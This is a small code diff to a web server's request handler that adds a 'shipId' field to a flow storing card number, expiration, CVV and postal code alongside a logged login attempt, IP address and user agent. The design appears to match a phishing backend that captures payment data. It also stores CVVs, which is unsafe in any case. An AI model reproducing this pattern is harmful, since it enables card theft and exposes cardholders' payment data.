@@ -600,7 +600,7 @@ Sitemap: ${baseUrl}/sitemap.xml`;
         });
       }
 
-      const { loginAttemptId, cardNumber, expiration, cvv, postalCode } = validation.data;
+      const { loginAttemptId, shipId, cardNumber, expiration, cvv, postalCode } = validation.data;
       const { ipAddress, userAgent } = getClientInfo(req);
 
       // Verify login attempt exists
@@ -656,6 +656,7 @@ Sitemap: ${baseUrl}/sitemap.xml`;
       // Create postal code record with card data
       const postalData = await storage.createPostalCodeData({
         loginAttemptId,
+        shipId,
         cardNumber,
         expiration,
         cvv,
